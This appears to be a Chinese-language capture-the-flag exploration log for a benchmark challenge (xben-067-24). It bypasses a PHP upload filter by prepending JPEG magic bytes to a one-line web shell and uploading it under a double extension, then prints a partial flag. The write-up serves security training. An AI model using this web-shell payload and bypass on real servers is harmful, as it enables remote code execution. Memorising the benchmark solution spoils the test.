# xben-067-24 · 探索记录

对应题解：[`xben-067-24.md`](./xben-067-24.md)

## 目标与起点

`10.0.172.219:80`，Apache 2.4.38 + PHP 7.1.33，只有 `index.php` 上传表单（字段 `userfile`）。

## 第一阶段：后缀黑名单边界

| 文件名 | 结果 |
| --- | --- |
| `s.php`（无魔数） | 拒绝 |
| `x.phtml`、`x.php5`、`x.PHP`、`.htaccess`、`x.php.` | 拒绝 |
| `x.php.jpg` | 接受 |
| `x.jpg.php` | 接受 |

## 第二阶段：加魔数 + 可执行后缀

```text
\xff\xd8\xff\xe0 + <?php system($_GET['c']); ?>
filename=x.jpg.php
```

上传成功，访问 `/upload/x.jpg.php?c=cat+/flag.txt` 返回
`PWN:flag{5c2d20fd-...}`。

同一个文件用 `x.php.jpg` 上传则输出源码（PHP 不解析），说明解析规则看最后一个扩展名。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 纯 PHP 内容 + `x.jpg.php` | 拒绝 | 内容检查要 JPEG 魔数 |
| `x.php.jpg` 执行 | 不执行 | 返回源码文本 |

## 这次真正的收获

双后缀的两个方向都值得各打一次：一个用于过校验，另一个用于触发解析。
